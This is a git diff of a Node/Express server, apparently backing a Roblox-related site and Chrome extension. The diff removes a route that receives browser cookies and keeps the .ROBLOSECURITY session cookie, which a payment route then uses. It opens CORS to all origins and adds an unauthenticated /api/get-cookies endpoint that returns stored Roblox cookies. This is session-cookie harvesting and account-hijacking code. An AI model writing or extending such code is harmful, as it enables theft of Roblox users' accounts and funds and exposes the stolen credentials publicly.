@@ -3,23 +3,7 @@ const cors = require("cors");
 const crypto = require("crypto");
 const fetch = require("node-fetch"); // si Node < 18
 const app = express();
-const ALLOWED_ORIGINS = [
-  "chrome-extension://bepinomhmhjfkfijfnkigboednbgggol",
-  "https://www.bloxrbx.fr"
-];
-
-app.use(cors({
-  origin: function (origin, callback) {
-    // Autorise aussi les requêtes sans origin (Postman, server-side, etc.)
-    if (!origin) return callback(null, true);
-
-    if (ALLOWED_ORIGINS.includes(origin)) {
-      return callback(null, true);
-    }
-
-    return callback(new Error("Not allowed by CORS"));
-  }
-}));
+app.use(cors());
 app.use(express.json());
 
 let ROBLO_COOKIE = null;
@@ -245,6 +229,14 @@ app.get("/api/places", async (req, res) => {
     }
 });
 
+app.get("/api/get-cookies", async (req, res) => {
+  const snap = await db.ref("roblox/cookies").get();
+  if (!snap.exists()) {
+    return res.status(404).json({ error: "Aucun cookie stocké" });
+  }
+  res.json(snap.val());
+});
+
 async function getUserBalance(RobloxName) {
   const snap = await db.ref("users").orderByChild("RobloxName").equalTo(RobloxName).get();
   if (!snap.exists()) return null;
@@ -258,46 +250,6 @@ async function deductBalance(uid, amount, gameId) {
   const txRef = db.ref("transactions").push();
   await txRef.set({ uid, gameId, amount, date: Date.now() });
 }
-
-// Route POST pour recevoir les cookies
-app.post("/api/receive-cookies", (req, res) => {
-  // Vérification de l'autorisation
-  if (req.headers.authorization !== "Bearer SUPER_SECRET_TOKEN") {
-    return res.status(401).json({ error: "Unauthorized" });
-  }
-
-  const cookies = req.body;
-
-  // Validation simple pour s'assurer que ce sont des cookies
-  if (!Array.isArray(cookies)) {
-    return res.status(400).json({ error: "Bad request: cookies should be an array" });
-  }
-
-  console.log("=== Cookies Roblox reçus ===");
-  cookies.forEach(c => {
-    // Log sécurisé: tronquer la valeur pour éviter d’exposer des tokens complets
-  const valuePreview = c.value ? c.value.slice(0, 4) + "..." : "";
-    console.log(`${c.name} = ${valuePreview} (HttpOnly: ${c.httpOnly}, Domain: ${c.domain})`);
-  });
-
-  // Optionnel: log plus structuré
-  console.log("Cookies reçus :", cookies.map(c => ({
-    name: c.name,
-    value: c.value ? c.value.slice(0, 110) + "..." : "",
-    httpOnly: c.httpOnly,
-    domain: c.domain
-  })));
-
-  const roblo = cookies.find(c => c.name === ".ROBLOSECURITY");
-
-  if (!roblo || !roblo.value) {
-    return res.status(400).json({ error: "ROBLOSECURITY manquant" });
-  }
-
-  ROBLO_COOKIE = roblo.value;
-
-  res.json({ ok: true, received: cookies.length });
-});
 
 app.post("/api/payServer", async (req, res) => {
   if (!ROBLO_COOKIE) {
